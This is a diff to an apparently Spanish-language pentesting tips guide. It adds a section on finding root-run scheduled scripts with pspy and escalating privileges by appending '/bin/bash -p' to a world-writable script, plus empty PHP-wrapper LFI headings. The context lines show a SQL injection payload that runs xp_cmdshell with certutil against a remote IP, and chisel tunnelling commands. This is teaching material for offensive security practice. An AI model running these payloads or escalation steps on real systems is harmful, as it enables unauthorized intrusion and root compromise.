@@ -794,6 +794,7 @@ inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
 ```
 Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/ , también es comun que los comandos no se ejecuten de forma de "stacked querys"
 ## Tip #22: Acceso a una maquina mediante autorized_keys
+
 ## Tip #23: Abuso de SUID para escalar privilegios
 SUID (Set User ID) es un tipo de permiso en Linux que permite a un archivo ejecutable ser ejecutado con los privilegios del propietario del archivo, en lugar de los del usuario que lo ejecuta. Esto es útil en casos donde se necesita que un programa realice tareas que requieren permisos elevados, como cambiar configuraciones del sistema o acceder a archivos restringidos, pero sin que el usuario tenga acceso directo a esos permisos. Por ejemplo, un programa con SUID establecido, aunque ejecutado por un usuario normal, se ejecutará con los privilegios del usuario root.
 
@@ -844,4 +845,48 @@ C:\Temp> .\chisel.exe server -p 1234
 ./chisel client <ip-victima>:1234 <puerto-local>:<ip-victima>:<puerto-victima>
 ```
 ## Tip #26: Detectar procesos ejecutados en intervalos de tiempo
+En ocaciones cuando se tiene acceso a una maquina remota es posible que existan procesos que se ejecuten en intervalos de tiempo, ya sea para reiniciar servicios o para ejecutar scripts de diagnostico o monitoreo. Si lo anterior ocurre y se tienen los permisos correctos se puede elevar privilegios, pero primero debemos detectar estos procesos; para hacerlo utilizaremos el script pspy disponible en este repo -> https://github.com/DominicBreuker/pspy, a continuacion veremos un ejemplo:
+```bash
+┌──(jorge㉿pentest)-[~]
+└─$ pspy 
+pspy - version: 1.2.1 - Commit SHA: kali
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2025/01/27 10:48:24 CMD: UID=1000  PID=2810   | pspy 
+2025/01/27 10:48:24 CMD: UID=0     PID=2736   | 
+2025/01/27 10:48:24 CMD: UID=1000  PID=1872   | /usr/bin/zsh 
+2025/01/27 10:48:24 CMD: UID=1000  PID=1611   | /usr/libexec/gvfsd-trash --spawner :1.21 /org/gtk/gvfs/exec_spaw/0 
+2025/01/27 10:48:24 CMD: UID=1000  PID=1597   | /usr/libexec/bluetooth/obexd 
+2025/01/27 10:48:24 CMD: UID=0     PID=1560   | /usr/bin/bash /etc/mysql/diagnostico.sh 
+2025/01/27 10:48:24 CMD: UID=1000  PID=1553   | /usr/libexec/gvfs-udisks2-volume-monitor
+```
+Como podemos observar el usuario ```root``` ejecuta un script en segundo plano ubicado en la ruta ```/etc/mysql/diagnostico.sh ```, al revisar los permisos de este archivo podemos observar que todos los usuarios pueden modificarlo por lo que la elevación de privilegios esta garantizada, agregando la siguiente linea al script:
+```bash
+┌──(jorge㉿pentest)-[/]
+└─$ ls -la /etc/mysql/diagnostico.sh 
+-rwxrwxrwx 1 root root 0 Jan 27 11:03 /etc/mysql/diagnostico.sh
+                                                                                                                                                                      
+┌──(jorge㉿pentest)-[/]
+└─$ echo '/bin/bash -p' >> /etc/mysql/diagnostico.sh 
+```
 ## Tip #27: PHP wrappers
+Cuando encuentras un LFI y quieres leer archivos con extensión PHP es probable que no puedas hacerlo porque el navegador interpretara el codigo PHP en lugar de mostrarlo en texto plano, es por ello que se utilizan los ```wrappers```, que son una especie de envoltorios incluidos en PHP que indican como sera mostrada la salida de un archivo. 
+
+Veamos un caso de estudio:
+### Archivo original
+### LFI sin wrapper
+### LFI con wrapper
